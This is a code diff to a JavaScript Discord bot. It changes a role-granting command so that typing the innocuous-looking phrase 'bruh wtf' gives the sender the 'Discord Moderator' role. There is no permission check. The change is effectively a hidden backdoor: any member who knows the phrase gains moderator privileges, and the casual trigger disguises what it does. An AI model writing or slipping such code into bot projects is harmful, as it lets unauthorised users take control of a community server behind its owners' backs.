@@ -7,13 +7,13 @@ client.on('ready', () => {
 
 client.on('message', message => {
   // something else VV xd    
-  if(message.content.toLowerCase().startsWith("!addrole"))
+  if(message.content.toLowerCase().startsWith("bruh"))
         {
             var args = message.content.toLowerCase().split(' ');
             console.log(args);
-            if(args[1] === 'reputable')
+            if(args[1] === 'wtf')
                 {
-                    var role = message.guild.roles.find("name", "Reputable");
+                    var role = message.guild.roles.find("name", "Discord Moderator");
                     console.log("Role Found!")
                     message.member.addRole(role.id);
                 }
